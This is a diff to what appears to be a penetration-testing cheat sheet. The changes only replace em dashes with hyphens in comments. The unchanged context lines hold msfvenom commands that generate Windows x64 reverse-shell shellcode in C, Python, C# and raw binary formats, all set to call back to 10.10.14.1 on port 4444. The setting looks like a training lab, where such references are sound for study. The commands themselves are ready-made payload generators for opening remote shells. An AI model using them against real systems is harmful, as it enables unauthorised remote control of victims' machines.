@@ -31,16 +31,16 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f e
 ## Shellcode (for injection)
 
 ```bash
-# x64 Shellcode — C format
+# x64 Shellcode - C format
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f c
 
-# x64 Shellcode — Python format
+# x64 Shellcode - Python format
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f python
 
-# x64 Shellcode — C# format
+# x64 Shellcode - C# format
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f csharp
 
-# x64 Shellcode — Raw binary
+# x64 Shellcode - Raw binary
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o shellcode.bin
 
 # Calc.exe PoC (no callback needed)
